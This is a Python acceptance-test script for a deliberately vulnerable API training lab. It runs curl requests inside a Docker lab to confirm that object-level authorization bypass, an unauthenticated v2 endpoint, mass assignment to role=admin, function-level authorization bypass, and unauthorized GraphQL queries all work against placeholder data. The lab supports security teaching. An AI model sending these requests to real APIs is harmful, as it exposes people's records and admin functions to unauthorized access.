#!/usr/bin/env python3
"""verify.py - acceptance test for lab-08-api (lab health, not a solution)."""
import subprocess, sys
WS = "ptlab08_ws"
def ws(cmd):
    return subprocess.run(["docker","exec",WS,"sh","-c",cmd], capture_output=True, text=True).stdout
def check(n, ok): print(f"  [{'PASS' if ok else 'FAIL'}] {n}"); return ok
def main():
    if WS not in subprocess.run(["docker","ps","--filter",f"name={WS}","--format","{{.Names}}"],
                                capture_output=True, text=True).stdout:
        print("Lab not running. Start it: ./labs/lab up lab-08-api"); sys.exit(2)
    r = []; print("lab-08-api acceptance test:")
    tok = ws('curl -s -X POST http://api:5000/api/v1/login -H "Content-Type: application/json" '
             '-d \'{"username":"alice","password":"password"}\'')
    import re; m = re.search(r'"token":"([^"]+)"', tok); t = m.group(1) if m else ""
    r.append(check("login issues a token", bool(t)))
    r.append(check("BOLA + excessive data exposure (other user's ssn)",
        "LAB-SSN-000-33-3333" in ws(f'curl -s http://api:5000/api/v1/users/3 -H "Authorization: Bearer {t}"')))
    r.append(check("v2 endpoint has no auth (improper inventory)",
        '"username":"admin"' in ws('curl -s http://api:5000/api/v2/users/3').replace(" ", "")))
    r.append(check("mass assignment sets role=admin",
        '"role":"admin"' in ws('curl -s -X POST http://api:5000/api/v1/users -H "Content-Type: application/json" '
                               '-d \'{"username":"mallory","role":"admin"}\'').replace(" ", "")))
    r.append(check("BFLA admin flag with non-admin token",
        "LAB-FLAG-api" in ws(f'curl -s http://api:5000/api/v1/admin/flag -H "Authorization: Bearer {t}"')))
    r.append(check("GraphQL introspection enabled",
        "allUsers" in ws('curl -s -X POST http://api:5000/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema}"}\'')))
    r.append(check("GraphQL adminSecret lacks authorization",
        "LAB-FLAG-api" in ws('curl -s -X POST http://api:5000/graphql -H "Content-Type: application/json" -d \'{"query":"{adminSecret}"}\'')))
    print()
    print("RESULT: OK - vulnerable API healthy and isolated." if all(r)
          else "RESULT: FAIL - reset: ./labs/lab reset lab-08-api")
    sys.exit(0 if all(r) else 1)
if __name__ == "__main__":
    main()
